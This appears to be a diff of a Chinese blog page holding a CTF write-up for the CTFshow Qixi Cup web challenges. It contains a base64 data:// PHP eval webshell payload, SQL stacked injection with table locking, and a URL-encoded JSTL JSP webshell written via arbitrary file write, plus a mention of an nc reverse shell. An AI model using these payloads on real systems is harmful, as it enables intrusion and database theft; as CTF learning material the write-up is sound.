@@ -6,14 +6,12 @@
     <meta charset="utf-8">
     <meta name="keywords" content="CTFshow七夕杯复现, 学习记录">
     <meta name="description" content="
-
 hhh，玩一下这个七夕杯
-
 
 web1 签到打开题目如下：
 
 能够执行短命令，但是不会回显。查看网页的源代码发现了前端javascript限制了输入命令的长度。
-以为直接burpsuite抓包绕过即可，没想到还是提示命令过长，所以后端应">
+以为直接burpsuite抓包绕过即可，没想到还是提示命令过长，所以后端应该也">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -499,10 +497,8 @@ web1 签到打开题目如下：
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>hhh，玩一下这个七夕杯</p>
 <span id="more"></span>
-
 <h3 id="web1-签到"><a href="#web1-签到" class="headerlink" title="web1 签到"></a>web1 签到</h3><p>打开题目如下：</p>
 <p><img src="Users\mirror\Desktop\write-up\blog\source\images\image-20220807183934882.png" alt="image-20220807183934882"></p>
 <p>能够执行短命令，但是不会回显。查看网页的源代码发现了前端javascript限制了输入命令的长度。</p>
@@ -530,9 +526,6 @@ def get_flag(url):
 if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
     get_flag(url)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="easy_calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
 
@@ -566,23 +559,17 @@ function check(&amp;$code)&#123;
 &#125;
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>没有括号的命令执行，php当中不需要括号的函数有<code>include,require,echo</code>等，这样的函数叫做语言结构。</p>
 <p>所以思路就是利用include+伪协议读取文件。由于题目过滤了尖括号，所以可以选择进行一个base64编码绕过。</p>
 <p>我们要执行的命令是：</p>
 <pre class="line-numbers language-none"><code class="language-none">include &quot;data:&#x2F;&#x2F;text&#x2F;plain,@&lt;?php eval($_GET[1]);?&gt;&quot;
 base64编码一下
 include &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9HRVRbMV0pOz8+&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>注意到最终eval执行的是三个参数连接在一起的，而且中间的参数必须是加减乘除，所以应该这样传参：</p>
 <pre class="line-numbers language-none"><code class="language-none">num1&#x3D;include &quot;data:&#x2F;&amp;symbol&#x3D;&#x2F;&amp;num2&#x3D;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9HRVRbMV0pOz8+&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>这里有一个坑点啊，直接在网页用hackbar传参会失败，似乎num1参数的data:后面不能跟斜杠，后面用python脚本就可以了。</p>
 <p>官方的优雅写法：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">num1&#x3D;include &quot;data:ctfshow&amp;symbol&#x3D;&#x2F;&amp;num2&#x3D;b;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
 
 
@@ -601,7 +588,6 @@ def getFlag():
 if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
         getFlag()
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h3 id="easy_cmd"><a href="#easy-cmd" class="headerlink" title="easy_cmd"></a>easy_cmd</h3><p>使用nc命令反弹shell即可。</p>
 <h3 id="easy_sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>下载打开题目的附件，看到WEB-INF，应该是javaweb没跑了。直接用IDEA打开。</p>
 <p>但是不知道从什么地方入手，因为我对javaweb并不熟悉。看答案是从controller开始审计的。</p>
@@ -611,14 +597,11 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <p>跟进一下<code>sql_check</code>函数</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">String[] ban &#x3D; new String[]&#123;&quot;&#39;&quot;, &quot;file&quot;, &quot;information&quot;, &quot;mysql&quot;, &quot;from&quot;, &quot;update&quot;, &quot;delete&quot;, &quot;select&quot;, &quot;,&quot;, &quot;union&quot;, &quot;sleep&quot;, &quot;(&quot;&#125;;
        String[] var2 &#x3D; ban;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>ban掉了单引号，但是我们可以用斜杠转义掉用户名后的单引号从而闭合sql语句。因为执行的sql语句是这样的：</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">String sql &#x3D; &quot;select username,password from app_user where username &#x3D;&#39;&quot; + username + &quot;&#39; and password &#x3D;&#39;&quot; + password + &quot;&#39; ;&quot;;
                 ResultSet resultSet &#x3D; DbUtil.getInstance().query(sql);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>令username&#x3D;\，password&#x3D;;%23，那么执行的SQL语句就是</p>
+<p>令username=\，password=;%23，那么执行的SQL语句就是</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">&quot;select username,password from app_user where username &#x3D;&#39;\&#39; and password &#x3D;&#39;;#&#39; ;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>这样就成功闭合了SQL语句，但是username和password并没有插入SQL注入代码，我们如何进行注入呢？</p>
 <p>从配置文件<code>config.properties</code>中看到<code>allowMultiQueries=true</code>，这说明允许堆叠查询。那我们就可以在password处进行堆叠注入。</p>
 <p>回到主函数来就会发现执行完select语句之后并没有输出相应的查询结果，那我们就继续往下面跟进，发现<code>this.insertQueryLog(username, password);</code>跟进这个函数内部发现执行了一个insert语句</p>
@@ -628,7 +611,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
             LogUtil.save(username, password);
             var8.printStackTrace();
         &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这个<code>LogUtil.save</code>是干嘛的呢？继续跟进看看。</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"> public LogUtil() &#123;
     &#125;
@@ -638,7 +620,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
     &#125;
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>看名字似乎是一个保存文件的操作，继续跟进一下<code>saveFileAs</code>函数。</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">public static boolean SaveFileAs(String content, String path) &#123;
         FileWriter fw &#x3D; null;
@@ -668,14 +649,12 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 
         return var4;
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>看到这明白了，这个函数会以username为内容，password为文件名创建一个文件。而这两个参数又是我们可控的，所以这里存在任意文件写的漏洞。根据前面的分析，想利用到这个函数，就必须触发一开始的insert语句报错，最终执行到这个函数。</p>
 <p>所以现在的目标是往username写木马，但是先要触发一个insert语句的报错。插入语句的报错通常有三种情况，分别是修改表造成主键重复、删除表造成查询错误、锁表。</p>
 <p>答案采用的是锁表的操作，学到啦0_0</p>
 <p>那么我们就先传参，利用堆叠注入先锁表。之后就传恶意木马触发报错从而写入文件。</p>
 <p>第一步：</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">username&#x3D;a\&amp;password&#x3D;;flush tables with read lock;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>第二步：</p>
 <p>写入jsp文件，由于过滤了括号，这时候只能用jstl标签来执行jsp代码，这样就完美避开了括号。</p>
 <pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;
@@ -699,13 +678,10 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
             &lt;&#x2F;tr&gt;
         &lt;&#x2F;c:forEach&gt;
     &lt;&#x2F;table&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p> 进行一个url编码之后直接post写入jsp木马。<code>param.driver,param.url,param.sql</code>都是我们要传给木马的参数。</p>
 <pre class="line-numbers language-none"><code class="language-none">username&#x3D;%3C%25%40%20page%20language%3D%22java%22%20contentType%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%0A%20%20%20%20pageEncoding%3D%22UTF-8%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fsql%22%20prefix%3D%22sql%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fcore%22%20prefix%3D%22c%22%25%3E%0A%3C%25%40%20page%20isELIgnored%3D%22false%22%20%25%3E%0A%3Csql%3AsetDataSource%20var%3D%22test%22%20driver%3D%22%24%7Bparam.driver%7D%22%0A%20%20%20%20%20%20%20%20url%3D%22%24%7Bparam.url%7D%22%20user%3D%22root%22%20password%3D%22root%22%20%2F%3E%0A%20%20%20%3Csql%3Aquery%20dataSource%3D%22%24%7Btest%7D%22%20var%3D%22result%22%3E%0A%20%20%20%20%20%20%20%20%24%7Bparam.sql%7D%0A%20%20%20%20%3C%2Fsql%3Aquery%3E%0A%0A%0A%0A%3Ctable%20border%3D%221%22%20width%3D%22100%25%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3Et%3C%2Fth%3E%0A%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3Cc%3AforEach%20var%3D%22row%22%20items%3D%22%24%7Bresult.rows%7D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Cc%3Aout%20value%3D%22%24%7Brow.t%7D%22%20%2F%3E%3C%2Ftd%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fc%3AforEach%3E%0A%20%20%20%20%3C%2Ftable%3E&amp;password&#x3D;..&#x2F;webapps&#x2F;ROOT&#x2F;1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>最后使用配置文件里的信息连接这个木马查询数据库信息即可。</p>
 <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">http:&#x2F;&#x2F;xxx&#x2F;1.jsp?driver&#x3D;com.mysql.jdbc.Driver&amp;url&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;app?characterEncoding&#x3D;utf-8&amp;useSSL&#x3D;false&amp;&amp;autoReconnect&#x3D;true&amp;allowMultiQueries&#x3D;true&amp;serverTimezone&#x3D;UTC&amp;sql&#x3D;select group_concat(table_name) as t from information_schema.tables where table_schema&#x3D;&quot;app&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>拿flag：</p>
 <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">http:&#x2F;&#x2F;xxx.com&#x2F;1.jsp?driver&#x3D;com.mysql.jdbc.Driver&amp;url&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;app?characterEncoding&#x3D;utf-8&amp;useSSL&#x3D;false&amp;&amp;autoReconnect&#x3D;true&amp;allowMultiQueries&#x3D;true&amp;serverTimezone&#x3D;UTC&amp;sql&#x3D;select f1ag as t from app_flag_xxoo_non0 union select 1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -962,7 +938,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                     <div class="summary block-with-text">
                         
                             
-
 简单学一手java在ctf中常见的题目类型。
                         
                     </div>
@@ -1009,7 +984,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
                     <div class="summary block-with-text">
                         
                             
-
 翻译一下这篇著名的论文。
                         
                     </div>
@@ -1088,7 +1062,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1100,7 +1074,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1229,7 +1203,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
